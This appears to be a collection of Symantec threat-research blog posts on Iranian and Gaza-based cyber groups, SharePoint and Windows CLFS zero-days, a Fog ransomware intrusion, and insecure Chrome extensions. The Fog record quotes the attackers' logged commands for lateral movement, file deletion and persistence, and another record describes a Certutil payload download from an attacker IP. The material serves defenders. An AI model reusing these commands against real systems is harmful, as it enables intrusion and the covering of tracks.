    "text": "The conflict in the Middle East continues to make headlines, as it has done since the October 7, 2023 Hamas attacks against Israel, which led to Israel retaliating with an ongoing onslaught on the Gaza Strip. The situation heated up further in recent weeks, with Israel and Iran both bombing each other’s territories, leading to U. S. intervention when it bombed Iran’s nuclear facilities, attempting to disrupt or destroy Iran’s nuclear program. Shortly after, U. S. President Donald Trump announced a ceasefire between the two countries, which, at time of writing, appears to be tentatively holding. While most of the attention has focused on the physical actions occurring in this war, such as bombing, aid blockades and destruction, another potential front in the war is cyber space, an increasingly common arena in modern conflicts. Both Israel and Iran, two of the main players in the current hostilities, have a history of carrying out destructive cyber attacks, including against each other. We published a whitepaper last year discussing the cyber activity we typically see emanating from this region titledConflict in the Middle East: An Overview of Cyber Threat Actors and Risks. One of the most infamous cyber incidents to take place in this region was the deployment of the Stuxnet worm, which was designed to break laboratory equipment used by Iranian scientists to enrich uranium at the Natanz facility in Iran. This facility was one of the targets bombed by the U. S. in its recent strikes against Iran. Stuxnet was among the first known major nation-state cyberattacks that demonstrated hackers’ ability to manipulate and even destroy physical equipment. Stuxnet was designed to cause the spinning motors at the bottom of Natanz's enrichment centrifuges to shatter. It was firstpublished about by researchers at Symantec in 2010, after the worm spread outside of the Natanz facility and was found on private networks. Stuxnet has long been suspected to be the work of the U. S. and Israel, though it has never been claimed by either country. Given that Stuxnet was only discovered after penetrating private networks, it is quite possible that cyber operations are currently being leveraged by and against these governments without our knowledge. Recent media reports indicate potential cyber warfare impacting the region, including an attack by pro-Israel hackers dubbed Predatory Sparrow on Iranian crypto exchange Nobitex in whichthe attackers drained $90 million of cryptocurrencyfrom the exchange. There were alsoreportsthat Iranian group Damselfly was carrying out a targeted phishing campaign focused on high-profile Israeli individuals, particularly prominent academics, journalists, and security researchers (See more in Damselfly profile). Damselfly is just one of the key cyber actors who are most likely to be active in the current conflict, potentially targeting the networks of significant institutions in other nations for espionage, disruptive or destructive purposes. We have reasonably good insight into some of the main Iranian actors and their activity. Iranian threat actors have become increasingly proficient in recent years. Not only has their malware improved, but they’ve also developed a strong social engineering capability that they’ve leveraged against targets of interest, even mounting digital honeytrap operations. One of the hallmarks of Iran’s operations in cyberspace is that it periodically mounts destructive attacks against organizations in countries it deems hostile, which at the moment would obviously include the U. S., and its long-standing foe Israel. That creates a risk for organizations in those countries because these attacks are about sending a message rather than stealing information, which means that any organization in the country targeted could be in the firing line. There are a couple of Iranian threat actors worth noting that are among the most active at the moment, the first of which is Seedworm (aka MuddyWater, Temp Zagros, Static Kitten). Seedworm is a long-standing Iranian group, which usually mounts classic espionage attacks for the purposes of spying and information gathering. Active since 2017, CISA said that Seedworm is “a subordinate element within the Iranian Ministry of Intelligence and Security.” Seedworm originally focused on victims in the Middle East but later broadened its scope to target telecommunications, defense, local government, and oil and natural gas organizations in Asia, Africa, Europe, and North America. The group develops its own custom malware as well as using dual-use and living off the land tools. While originally focused on espionage, in recent timesSeedworm has begun either collaborating with another threat group, or else has a sub-group within it, carrying out destructive attacks that masquerade as ransomware. These attacks involve ransomware known as DarkBit and, while it does encrypt computers like regular ransomware, the attackers seem more interested in making a statement than collecting a ransom. Some of the ransom notes they’ve left have had an unusually political tone, implying the ransomware was deployed more as retaliation rather than a money generating exercise. A recent campaign tentatively linked to Seedworm focused on smaller organizations, including organizations in utility, transport, and the manufacturing sector outside the Middle East. The attackers took advantage of compromised home routers that were infected with the Mirai malware. It isn’t clear if this access was purchased or if the infections were initiated by Seedworm itself, but it had access to numerous compromised home routers from which it attacked the victim organizations by proxying through them. These attacks did not come from Iranian IP addresses, they came from small routers in a whole range of countries. Seedworm used this network of hacked routers to scan for vulnerable IIS servers, and used a variety of known vulnerabilities to then gain access to these servers. Once on these servers, it used an off-the-shelf tool, known as Plink, that allowed it to create a reverse RDP tunnel. Plink is a legitimate off-the-shelf tool. RDP inbound connections were blocked by the firewall but Plink is able to create an outbound SSH connection back to the attacker, which is allowed, and that connection is then used to tunnel classic RDP traffic, bypassing the firewall. Seedworm then sideloaded BruteRatel, a commercial red-teaming and adversarial attack simulation tool, and used a scheduled task for persistence. The attackers used Brute Ratel to obtain credentials and once they had them they began to latterly traverse to other machines and ultimately obtained more credentials using reg.exe, by dumping the SAM. Seedworm then gained access to file servers and SQL servers seeking data of interest. It launched SQL injection attacks across the internal network to gain access to the SQL servers. The attackers then installedndisproxyon the web servers to create an attacker-in-the-middle (AITM) attack to exploit and infect actual victims of interest, such as government organizations that visit and use these private organizations’ services. In most cases, they weren’t interested in the infected victim, they were actually interested in using the access as a jumping off point to gain access to another organization. Some of the target organizations held key personal data of victims of interest – for example government officials. The attackers also appeared to be interested in digital certs, which they stole to sign their own tools to use against other organizations. Transportation companies were also among the group’s targets. Iranian attack groups have historically been interested in the transport sector in order to track the movements of both goods and individuals to gain an insight into military equipment and high-value shipments etc, and, in some cases, for the purposes of foreign and domestic intelligence gathering operations. All of the infected organizations in this campaign were SMBs, in a variety of sectors and all based outside the Middle East. None of them were “typical” victims for Iranian threat groups, pointing to a widening scope in victims targeted by Seedworm. Druidfly (aka Homeland Justice, Karma), which specializes in disk-wiping attacks, is another Iranian attack group to be aware of. It first came to public attention after a July 2022 wiper attack on multiple targets belonging to the government of Albania. The wiper left messages directed against the Mujahideen E-Khalq (MEK), an Iranian dissident organization based in Albania. Shortly afterward, a group calling itself Homeland Justice claimed credit for the attack. In response to the attack, Albania broke off diplomatic relations with Iran. This triggered another wave of attacks in September 2022, apparently in retaliation for Albania publicly attributing the attacks to Iran. While Homeland Justice purported to be a hacktivist outfit, the FBI later established that “Iranian state cyber actors” were responsible for the attacks. Druidfly reappeared in 2023, when it began targeting Israel with a wiper called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is “Bibi”(See Case Study). Druidfly is currently active amidst the ongoing conflict and tensions in the region. The Threat Hunter Teamtweeted on June 20, 2025, that we had seen a Druidfly wiper targeting organizations in Albania. The wiper was signed with a legitimate certificate, which was probably stolen. On the Monday following (June 23),it was reported in the media that public services in Albania’s capital Tirana had been disrupted by a cyber attackthat took down the city’s official website and affected local government operations. Homeland Justice claimed credit for the attack and said it had taken down the city’s official website, exfiltrated data and wiped servers, citing the presence of MEK in the country as the reason for the attack. Following the escalation of the conflict in Gaza in 2023, Druidfly was linked to a series of wiper attacks against multiple targets in Israel. In this case, the attacks were carried out under a persona called Karma that purports to be a hacktivist group sympathetic to the Palestinian cause. The wiper deployed in these attacks was called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is Bibi. The wiper encrypted files on the hard disk before overwriting the master boot record (MBR) and crashing the computer. Efforts to restart the computer would fail because of the destruction of the MBR. Analysis of the wiper revealed clear anti-Israel messages within the wiper’s code. Furthermore, analysis of BibiWiper by the Threat Hunter Team found clear similarities between it and wipers deployed by Druidfly during attacks against Albania in 2022 and 2023. Tracing other tools used to initiate the BibiWiper attacks against Israel revealed the following overlap in tactics, techniques, and procedures between these attacks and earlier Druidfly attacks: Damselfly (aka Charming Kitten, Mint Sandstorm) is an Iranian espionage group that has been active since 2014. It was initially known for targeting Israel with attacks before it broadened its focus to include the U. S. and other countries. While the group is principally known to be involved in intelligence gathering, members of the group are also known to have participated in extortion attacks. It has been linked by multiple vendors with Iran’s Islamic Revolutionary Guard Corps (IRGC). In March 2022, Damselfly wasone of several Iranian groups reported to have moved into mounting large-scale social engineering campaigns. Consistent features of these campaigns included the use of charismatic sock puppets, lures of prospective job opportunities, solicitation by journalists, and masquerading as think tank experts seeking opinions. The attackers leveraged networks such as LinkedIn, Facebook, Twitter, and Google. Damselfly has also been linked to an attack targeting a nuclear security expert at a U. S.-based think tank in July 2023; attacks on Israel’s transportation, logistics, and technology sectors in November 2023; as well as a January 2024 campaign targeting individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the UK, and the U. S. The attackers in that campaign used bespoke phishing lures themed around the Israel-Hamas conflict to trick targets into downloading malware. Most recently,Check Point reportedthat a new Damselfly campaign that began in mid-June 2025 targeted Israeli journalists, cyber security experts and computer science professors from leading Israeli universities with spear phishing campaigns in an attempt to steal credentials and multi-factor authentication codes in order to gain access to targets’ email accounts. Some of the victims were approached by attackers who posed as fictitious assistants to technology executives or researchers through emails and WhatsApp messages. Active since at least 2014, Mantis (aka Desert Falcon, Arid Viper, APT-C-23), is an Arabic speaking group that appears to be based in the Gaza Strip. The group is known to mount espionage attacks against targets in the government, military, media, financial, research, education, and energy sectors. Most of its attacks have been against organizations in the Middle East but it has, on occasion, attacked targets outside the region. It has also been known on occasion to target individuals or organizations internally within Gaza. Whileother vendors have linked the group to Hamas, the Threat Hunter Team cannot make a definitive attribution to any Palestinian organization. The group mainly favors spear-phishing emails with malicious attachments or links to malicious files as its main infection vector. Mantis uses custom malware and its most recent toolset includes the backdoors Trojan. Micropsia and Trojan. AridGopher. Micropsia is capable of taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration. However, its main purpose appears to be running secondary payloads for the attackers. Arid Gopher is a modular backdoor that is written in Go. It appears to be regularly updated and rewritten by the attackers, most likely to evade detection. These tools were used in a Mantis attack in late 2022/early 2023 that targeted organizations within the Palestinian territories. The initial infection vector for this campaign remains unknown, but both the Micropsia and AridGopher malware were deployed in this attack. In one intrusion, the attackers deployed three distinct versions of the same toolset (that is, different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. If the Mantis operators are based within Gaza it is unlikely the group is operational at the moment given the blockade of the territory by Israel and limited internet access in the region. However, it’s not unusual for members of groups to be based outside the countries or regions they are operating on behalf of, which could be the case for Mantis operators, though we have no evidence of this. As the conflict in the Middle East continues, the types of cyberattacks we are likely to see emanating from Iran, potentially directed at Israel but also against its backers such as the U. S., are probably going to be either espionage or disruption attacks. Seedworm, Damselfly and Druidfly are some of the most likely actors we could see venturing into this conflict, with the groups having the skills and experience to carry out potentially serious and destructive attacks. Iranian actors’ skills at social engineering are something that organizations in Israel, the U. S., and other nations or organizations of interest should be aware of. Iranian threat actors also have a history of carrying out attacks at times when they know organizations' guard may be down - such as at the weekend or during public holidays when activity would be more likely to pass unnoticed for a longer period of time. This was most clearly demonstrated during theShamoon wiping attacksthat targeted organizations in Saudi Arabia in 2012, 2016 and 2018, which mostly began on holidays or weekends. As we head into vacation season for many in the U. S., cyber teams should have their guard up as threat actors may think this quieter time could be a prime opportunity to get a grip on networks and potentially cause major disruption.

Update 2025-07-21, 10:40 UTC: Blog has been updated with additional indicators of compromise (IOCs). Microsoft has partiallypatched a zero-day vulnerability in SharePointfollowing reports of its exploitation in the wild. The vulnerability (CVE-2025-53770), dubbed ToolShell, affects on-premises SharePoint servers and gives an attacker unauthenticated access to vulnerable servers, allowing them to remotely execute code and access all content and file systems. While the 2019 version of SharePoint Server and SharePoint Server Subscription Edition have been patched, the 2016 version remains unpatched. In its guidance on the vulnerability, Microsoft said it was “aware of active attacks targeting on-premises SharePoint Server customers”. It provided no further information on which actors were behind these attacks. The new zero-day vulnerability is a variant of a recently patched vulnerability,CVE-2025-49704, which was patched in July 2025. Symantec products already block exploitation of this vulnerability with the following network protection: Web Attack: Microsoft SharePoint CVE-2025-49704. A second, related vulnerability (CVE-2025-53771) has also been patched. A path traversal bug, it allows an authorized attacker to perform spoofing over a network. It too is a variant of a recently patched vulnerability (CVE-2025-49706) and the patch includes more robust protections against exploitation of the older flaw. One some networks where post-exploitation activity took place, the attackers first ran an encoded PowerShell command. The attackers then used Certutil to download a file named client.exe (SHA256: fd03d881f0b3069f5adec6ae69181899e72fd27b3e75bb9075d0798ed3184274) from 134.199.202[.]205 and save it as a file named debug.js. PowerShell was used to run commands as below with the –value parameter used to pass commands: The executable was likely renamed as debug.js in order to make it look benign and avoid raising suspicions. It then ran the following batch file located at c:\\\\temp\\\\test.bat: The executable was also used to run the following files: Backup.exe is a renamed variant of WinRAR. It was used to steal cryptographic secrets: In addition to this, Certutil was also used to download a file named agent.x64.exe (SHA256: 04f7326c40c33fda51010d067915a1e50b63e00b4ab86db00158d5e067a78ff6).

    "text": "A May 2025 attack on a financial institution in Asia saw the Fog ransomware deployed, alongside an unusual toolset, including some dual-use and open-source pentesting tools we have not observed being used in ransomware attacks previously. The attackers used a legitimate employee monitoring software called Syteca (formerly Ekran), which is highly unusual and not something we have seen used in a ransomware attack chain before. They also deployed several open-source pentesting tools – GC2, Adaptix, and Stowaway – which are not commonly used during ransomware attacks. Also notable in this attack was that, a few days after the ransomware was deployed, the attackers created a service to establish persistence. This is an unusual step to see in a ransomware attack, with malicious activity usually ceasing on a network once the attackers have exfiltrated data and deployed the ransomware, but the attackers in this incident appeared to wish to retain access to the victim’s network. The attackers were on the target’s network for about two weeks before they deployed the ransomware. TheFog ransomware was first documented in May 2024, and initially appeared to be primarily focused on targeting educational institutions in the U. S. In those early attacks, attackers using Fog gained initial access to networks by leveraging compromised VPN credentials. It was reported in October 2024 that attackers using Fogwere targeting a critical vulnerability (CVE-2024-40711 - CVSS 9.8) in the Veeam Backup & Replication (VBR) serversthat was patched in September 2024. Meanwhile, in April 2025, Fog attackers were reported to be using email as an initial infection vector in ransomware attacks in whichthe language used in the ransom notes appeared to be mocking Elon Musk’s Department of Government Efficiency (DOGE) in an effort to goad victims. Also notable in that attack campaign was that the ransom notes also offered a “decrypt for free” option if the victim chose to spread the ransomware to somebody else's computer. The initial infection vector used by the attackers in this recent incident isn't known. Two of the infected machines were Exchange Servers. While there was no evidence to suggest they were the initial infection vector, exploiting vulnerabilities in Exchange Servers is a common initial infection vector for ransomware actors. The first suspicious activity on the network was the installation of multiple open-source, post-exploitation penetration testing tools, including variants of the GC2 tool, which is an open-source tool that allows an attacker to execute commands on target machines using Google Sheets or Microsoft SharePoint List and exfiltrate files using Google Drive or Microsoft SharePoint documents. The GC2 implant polls the Google Sheet or SharePoint List for each operator command, then uses it to store its output, a log, and records the execution polling interval it is configured with. It is used by the attackers for various discovery commands. cmd /c \"ipconfig /all\" cmd /c \"netstat -anot|findstr 3389\" When communicating with the remote attacker, the GC2 tool also checks for the following commands: It contains two embedded configuration blobs in encoded form. This tool is not something we have seen used in ransomware attacks before, though it was used inan attack carried out by Chinese nation-state backed actor APT41in 2023. The open-source Stowaway proxy tool was used to deliver the Syteca (formerly Ekran) executable. It is not clear exactly what the Syteca tool was used for by the attackers. In the attack, the file is named 'sytecaclient.exe', but it also appears with the name 'update.exe.' Syteca islegitimate employee monitoring softwarethat can record onscreen activity and monitor keystrokes, among other capabilities. Several libraries are loaded by this executable, suggesting it was possibly used for information stealing or spying, which would be the most likely reason the attackers would deploy it given the keylogging and screen capture capabilities of the tool. CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\x86\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper_7.20.576.0.dll\"\" Several commands that look like they are removing or killing the Syteca executable are also executed. This appears to be an attempt by the attackers to delete indicators and evidence of their activity on the network in an effort to avoid detection. CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClient.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClientSession.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranController.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"grpcwebproxy.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"PamConnectionManager.exe\" CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbdriverinstaller.exe\" -u [REDACTED] CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbolddriveruninstaller.exe PsExec was also used to remove the Syteca client configuration file and binary in another attempt by the attackers to delete evidence of the presence of Syteca on the network: psexec64.exe -accepteula \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"del C:\\users\\public\\SytecaClient.ini\" psexec64.exe -accepteula \\\\192.168.8.150 -u <?,?> -p <?,?> -h -s cmd /c \"rm C:\\users\\public\\SytecaClient.exe\" PsExec and SMBExec were also used alongside Syteca and GC2 for lateral movement across the victim network. SMBExec was used to launch Syteca: cmd.exe /Q /c SytecaClient.exe 1> \\\\127.0.0.1\\ADMIN$\\__1748095766.8385904 2>&1 PsExec was used to laterally execute a suspected process watchdog/launcher for the GC2 backdoor: psexec64.exe -accepteual \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"CSIDL_COMMON_APPDATA\\microsoft\\devicesync\\windowsdevicesync.exe\" SMBExec and PsExec are both living off the land tools that are commonly used by ransomware attackers: For data theft, the attackers download multiple file transfer utilities - Freefilesync and MegaSync - as well as using 7-zip to archive sensitive directories. Other tools used on the target’s network include the Adaptix C2 Agent Beacon, which is a component of anopen-source extensible post-exploitation and adversarial emulation framework, Adaptix C2, designed for use by penetration testers. The variant used on the target’s network in this incident contained a configuration blob in encrypted form. Adaptix can be considered a sort of open-source alternative to the well-known Cobalt Strike framework. The Adaptix beacon agent is similar to Cobalt Strike beacon; once implanted on a victim machine, it calls back to the attacker and provides command and control (C&C) access. The attackers also used Process Watchdog, a program that continuously enumerates running processes to check for a specific process, in this case the GC2 process, which has the filenameAppxModels.exeand, if not found on a machine, Process Watchdog creates the process. C:\\ProgramData\\Microsoft\\Windows\\Models\\AppxModels.exe On the day the Fog ransomware was deployed, the Impacket SMB tool was also used, suggesting this may have been used to deploy the ransomware. Notably, several days after the ransomware was deployed, a service was run to establish persistence on the victim network. This is likely another process watchdog used to launch one of the attacker’s command and control tools, such as GC2.sc create SecurityHealthIron binPath= \"CSIDL_SYSTEM\\diagsvcs\\runtimebroker.exe\" start= auto DisplayName= \"Collect performance information about an application by using command-line tools.\" sc start SecurityHealthIron There are a few things that mark this ransomware attack out as unusual. The toolset deployed by the attackers is quite atypical for a ransomware attack. The Syteca client and GC2 tool are not tools we have seen deployed in ransomware attacks before, while the Stowaway proxy tool and Adaptix C2 Agent Beacon are also unusual tools to see being used in a ransomware attack. The attackers establishing persistence on a victim network having deployed the ransomware is also not something we would typically see in a ransomware attack. These factors mean it could be possible that this company may in fact have been targeted for espionage purposes, with the ransomware attack merely a decoy, or perhaps also deployed in an attempt by the attackers to make some money while also carrying out their espionage activity.

    "text": "Many users assume that popular Chrome extensions adhere to strong security practices, especially when the extensions themselves promise functionality related to privacy, ranking analytics, or convenient new tab features. However, recent findings show that several widely used extensions—SEMRush Rank, PI Rank, MSN New Tab/Homepage, DualSafe Password Manager,andBrowsec VPN—unintentionally transmit sensitive data over simple HTTP. By doing so, they expose browsing domains, machine IDs, operating system details, usage analytics, and even uninstall information, in plaintext. Because the traffic is unencrypted, a Man-in-the-Middle (MITM) attacker on the same network can intercept and, in some cases, even modify this data, leading to far more dangerous scenarios than simple eavesdropping. This blog illustrates the exact points where these leaks occur, why they are problematic, and how the resulting disclosures can be exploited for profiling, data correlation, or targeted attacks. Two extensions, SEMRush Rank (ID: idbhoeaiokcojcgappfigpifhpkjgmab) with over 30,000 users, and PI Rank (ID: ccgdboldgdlngcgfdolahmiilojmfndl), exhibit identical patterns in their code. Both rely on a service URL of the form shown in Figure 1. The variable “url” corresponds to the user’s currently visited domain. The extensions thus call rank.trellian.com over plain HTTP, appending the entire domain name in the query string. Because HTTP provides no encryption, anyone with the ability to sniff network traffic can read that domain name. On a public Wi-Fi or compromised network, this means user browsing activity is visible to attackers. It is particularly concerning that these extensions are intended to display website rank, which suggests users might frequently engage them, causing repeated unencrypted calls that reveal domains the user is visiting. Browsec VPN (ID: omghfjlpggmjjaagoclmmobgdodcjboh) claims to have more than 6 million users. While it promises a secure and private web experience, its uninstall flow and manifest file illustrate a different story. The extension sets an uninstall URL in the background code. Notice theuninstallURLis chosen based on whether the build is “qa” or not, defaulting to anHTTPendpoint at browsec-uninstall.s3-website.eu-central-1.amazonaws.com. The code then gathers usage statistics (like countryChanges, iconClicks, and others), along with a unique user ID (userId), and appends them as query parameters. Finally, it calls chrome.runtime.setUninstallURL to ensure this plaintext link is opened when the user uninstalls Browsec. Even more revealing is the Browsec VPN manifest, which allows connect-src to a long list of HTTP domains such as http://trafcfy.com and many similar endpoints. This wide array of unsecured hosts suggests the extension is permitted to initiate plain HTTP connections to multiple third-party servers, undermining the expectation that a VPN-focused tool would always encrypt traffic. Because any unencrypted call is susceptible to interception or manipulation, a MITM attacker could hijack these Browsec VPN requests or responses, further jeopardizing user privacy. MSN New Tab (ID: lklfbkdigihjaaeamncibechhgalldgl) with about 500,000 users, and MSN Homepage, Bing Search & News (ID: midiombanaceofjhodpdibeppmnamfcj) with 10,000 users, rely on a function named SendPingDetails. That function, shown in Figure 4, transmits a MachineID and other details over HTTP. This code constructs a URL beginning with and appends parameters for the operating system (OS), the extension’s version (LV), and a unique machine identifier (MI). The MachineID is created by another function, guid, which generates a stable value to represent the user’s device. Because everything is sent in the clear (for example MI=someUniqueId123), it is easy to see how a passive listener on the network can collect that ID. Over time, repeated calls to the same ID can link multiple browsing sessions or physical locations, leading to sophisticated user profiling. The large user base of MSN New Tab in particular raises further concerns, since half a million or more users may be leaking OS details and stable machine IDs with each ping. DualSafe Password Manager & Digital Vault (ID: lgbjhdkjmpgjgcbcdlhkokkckpjmedgc), with around 300,000 users, is another example of an extension sending unencrypted analytics. In the snippet shown in Figure 5, the statistics.getURL method constructs an HTTP-based request. This function eventually causes the extension to make a call to stats.itopupdate.com over plain HTTP. The data includes the extension version, user’s browser language, and usage “type,” among other metrics. Although credentials or passwords do not appear to be leaked, the fact that a password manager uses unencrypted requests for telemetry erodes trust in its overall security posture. Network eavesdroppers or malicious access points can examine these calls to see how the extension is being used and possibly track the user’s environment. DualSafe has since addressed the problem in its latest release, switching the telemetry endpoint to HTTPS and encrypting all transmitted data. All of the previously mentioned extensions make HTTP requests that expose user data in plaintext. While none of them appear to leak direct passwords, the variety of information that does leak includes browsing domains, unique machine IDs, OS details, usage metrics, and even final uninstall parameters. Unencrypted traffic is trivially accessible to anyone performing a Man-in-the-Middle attack, allowing them not only to collect but also to potentially manipulate this data in flight. That data can be combined or correlated by any party who can intercept the connection, including malicious hotspots, internet service providers, and other eavesdroppers. Users of these extensions should consider removing them until the developers address the insecure calls. The risk is not just theoretical; unencrypted traffic is simple to capture, and the data can be used for profiling, phishing, or other targeted attacks. Developers, for their part, should switch to HTTPS whenever they send or receive data, especially if the purpose of their extension is to protect user privacy or provide security-related features. The overarching lesson is that a large install base or a well-known brand does not necessarily ensure best practices around encryption. Extensions should be scrutinized for the protocols they use and the data they share, to ensure users’ information remains truly safe. All of the developers whose extensions were discussed in this blog have been notified about the issues we uncovered. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "Hardcoded credentials—API keys, secrets, or tokens located directly in a browser extension’s JavaScript—rank among the most significant security oversights in modern development. Once published, these secrets are exposed to anyone who cares to look; an attacker needs only inspect the extension package to extract them. From there, the attacker can craft malicious requests—ranging from spamming analytics with bogus events to commandeering paid cloud services, incurring fees, and undermining user privacy. In this blog, we will examine individual examples drawn from popular Chrome extensions, noting the specific code snippets that reveal each secret and explaining the associated risks. TheAvast Online Security & Privacyextension (7,000,000+ users) andAVG Online Security(600,000+ users) share similar code, each containing a hardcoded Google Analytics 4 (GA4) API secret (Figure 1). Because the secret (GA4_API_SECRET) is appended to the URL, any attacker who discovers it could bombard the GA4 endpoint with spurious events, corrupting metrics or inflating analytics costs. AVG Online Securityreveals a virtually identical pattern in its code. Both extensions demonstrate how embedding a private key in the client code can lead to large-scale data pollution or unauthorized access to analytics resources. With over 5,000,000 users,Equatio – Math Made Digitalembeds an Azure API key used for speech recognition, as seen in Figure 2. Because the key resides in window.equatioAzureApiKey, anyone inspecting or debugging the extension can clearly see it. The code snippet shown in Figure 2 shows thatEquatiocalls fromSubscription(...) with the key to initialize Microsoft Azure’s speech-to-text service. If a malicious user replays or spams these calls, the developer’s Azure subscription could see inflated costs or usage exhaustion. BothAwesome Screen Recorder & Screenshot(3,000,000+ users) andScrolling Screenshot Tool & Screen Capture(400,000+ users) use virtually the same snippet for AWS S3 uploads, exposing the developer’s AWS access key (Figure 3). In both extensions, the embedded key is used to upload screenshots or images to the developer’s S3 bucket. Because the credentials appear in plain text, an attacker could script uploads to the same bucket—potentially hosting illegal content, pushing malicious files, or even pivoting to other AWS resources if the credentials have broader permissions. Essentially, a few lines of JavaScript here undermine the entire AWS environment’s security posture. Microsoft Editor(2,000,000+ users) reveals a telemetry key called StatsApiKey. In the code shown in Figure 4, the extension uses that key to log user data for analytics. Anyone with this key can generate spoofed telemetry data, polluting Microsoft’s analytics and potentially sabotaging any usage insights the developer relies upon. Worse, if the logging system imposes cost or rate limits, mass abuse can drain resources or lock the developer out of their own analytics suite. A significant security risk has been uncovered in over 90 Chrome extensions that use the third-party libraryInboxSDK, which contains hardcoded credentials. These credentials, including API keys, are often exposed directly in the source code, leaving the extensions vulnerable to exploitation. For instance, the popular extensionAntidote Connector, with over 1,000,000 users, includes this third-party library for certain Gmail requests. In the example shown in Figure 5, we see how this API key is inserted directly into the header for communication with Google services. The problem stems from the fact that these hardcoded credentials are accessible to anyone who inspects the extension's code. In the case of InboxSDK, the Google API key is attached to each request using 'x-goog-api-key': googleApiKey. This makes it easy for an attacker to replicate the request headers, potentially allowing them to access or manipulate Gmail data, or even spam Google’s endpoints until the developer’s usage quota is exhausted or blacklisted. Given that this vulnerability exists in over 90 extensions using InboxSDK, the issue poses a wide-reaching threat that extends beyond just a single extension. Antidote Connector has since resolved the flaw in its latest version, removing the hard-coded key and adopting a more secure authentication flow. Watch2Gether(1,000,000+ users) leaks a Tenor GIF search API key (Figure 6). Although Tenor is “just GIFs,” usage can still cost money or trigger rate limits if spammed at scale. Moreover, spamming large volumes of search requests could cause the developer’s account to get banned from the Tenor API. This example shows that even a seemingly benign, entertainment-related key can lead to real consequences. Watch2Gether has since patched the problem in their latest release, eliminating the exposed key and moving authentication to a more secure flow. InTrust Wallet(1,000,000+ users), the code reveals a fiat ramps API key (Figure 7). This key is concatenated into a string used to produce a signature for crypto purchase quotes. If an attacker duplicates the extension’s logic, they could generate authentic-looking requests to buy or sell cryptocurrency on behalf of unsuspecting users, or intercept real transactions to manipulate the quotes. This scenario is especially concerning because it touches on financial data and transactions. Rounding out these examples,TravelArrow(300,000+ users) exposes a geolocation API key (Figure 8). Using this key, the extension makes location queries to ip-api.com. If attackers replicate the calls or send them in large volumes, they could drive up usage, potentially leaving theTravelArrowdeveloper with hefty bills or disabled API access. Even an API used primarily for location can be abused when key-based metering or quotas are in play. From GA4 analytics secrets to Azure speech keys, and from AWS S3 credentials to Google-specific tokens, each of these snippets demonstrates how a few lines of code can jeopardize an entire service. The solution: never store sensitive credentials on the client side. Instead, route privileged operations through a secure backend server, where secrets remain protected behind environment variables or secret management systems. Regular key rotation, usage monitoring, and the principle of least privilege will further minimize risk. By removing exposed secrets from their extensions, developers keep user trust intact, avoid financial losses, and ensure more reliable analytics for their products.

    "text": "Attackers linked to the Play ransomware operation deployed a zero-day privilege escalation exploit during an attempted attack against an organization in the U. S. The attack occurred prior to the disclosure and patching of a Windows elevation of privilege zero-day vulnerability (CVE-2025-29824) in the Common Log File System Driver (clfs.sys) on April 8, 2025. Although no ransomware payload was deployed in the intrusion, the attackers deployed theGrixba infostealer, which is a custom tool associated with Balloonfly, the attackers behind the Play ransomware operation. Balloonfly is a cybercrime group that has been active since at least June 2022 and uses the Play ransomware (also known as PlayCrypt) in attacks. The group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. The initial infection vector may have been a public facing Cisco ASA firewall. The attackers moved by unknown means to another, Windows machine on the targeted network. During the attack, the Balloonfly operators deployed a variety of samples and hacktools in addition to the Grixba infostealer and the exploit for CVE-2025-29824 on this machine. Some of the samples aren’t available to us at the moment of writing, but they were located in the Music folder with suspicious names masquerading as Palo Alto software (paloaltoconfig.exe, paloaltoconfig.dll) or, for example, 1day.exe. To gather information on all the available machines in the victims’ Active Directory, the attackers executed the following command and saved the output to C:\\Users\\[REDACTED]\\Music\\AllWindows.csv file. powershell Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\[REDACTED]\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 The attackers elevated privileges by exploiting a vulnerability in the Common Log File System (CLFS) kernel driver. In order to interact with the driver, the exploit calls the CreateFileW() API, passing the string \"\\\\.\\LOG:\\??\\C:\\ProgramData\\SkyPDF\\PDUDrv\" as the lpFileName parameter. During that API call, the Windows kernel allocates a new FILE_OBJECT structure to represent that particular instance of a file open operation and then sends a request to the CLFS driver as identified by the \"\\\\.\\LOG:\" filename prefix. The request is represented as an I/O Request Packet (IRP) with the major function code IRP_MJ_CREATE and instructs the driver to perform the actual open operation. Acting on this request, the driver allocates additional structures, including an undocumented structure, CClfsLogCcb. A pointer to the created CClfsLogCcb structure is stored in the FsContext2 field of the FILE_OBJECT structure, suggesting that the CClfsLogCcb structure could be a Context Control Block associated with that file open operation. Finally, the Windows kernel allocates a new file handle that refers to the created FILE_OBJECT structure. The exploit then attempts to perform two I/O operations around the same time on that file handle by calling different APIs from two threads. From the first thread, the exploit calls the CloseHandle() API. During that API call, the Windows kernel closes the only file handle associated with the FILE_OBJECT 